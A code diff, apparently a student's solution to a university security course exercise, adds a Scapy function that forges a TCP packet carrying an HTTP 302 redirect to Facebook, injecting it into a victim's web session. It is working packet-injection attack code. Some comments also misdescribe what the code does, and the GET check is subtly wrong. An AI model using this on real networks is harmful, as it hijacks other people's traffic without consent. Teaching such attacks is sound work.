@@ -6,11 +6,11 @@ RESPONSE = '\r\n'.join([
     r'HTTP/1.1 302 Found',
     r'Location: http://www.facebook.com',
     r'',
-    r'')
+    r''])
 
 
 WEBSITE = 'infosec17.cs.tau.ac.il'
-
+HTTP_PORT = 80
 
 def get_tcp_injection_packet(packet):
     """
@@ -18,7 +18,23 @@ def get_tcp_injection_packet(packet):
     IP+TCP packet that will redirect the user to Facebook by sending them the
     `RESPONSE` from above.
     """
-    raise NotImplementedError()
+    if q1.packet_filter(packet):
+        if packet[S.TCP].load.find('GET'):
+            ip = packet[S.IP]
+            tcp = packet[S.TCP]
+            # IP layer of the response packet:
+            response = S.IP(dst = ip.src, src = ip.dst)
+            # Warpping the IP packet with a TCP layer and setting
+            # source port to match the original source port
+            # and destination port to be 80 for HTTP.
+            # Also sets the TCP flags to Acknowldeged and Finish (FA).
+            # Finally we set the sequence number to be the ack number of the packet
+            # and the ack number to be the seq number of the packet + the length of the tcp layer.
+            response = response / S.TCP(dport = ip.sport, sport = ip.dport, flags = 'FA', seq = tcp.ack, ack = tcp.seq + len(tcp.payload))
+            # Appending the load to the packet
+            response = response / S.Raw(load = RESPONSE)
+            return response 
+    return None
 
 
 def injection_handler(packet):
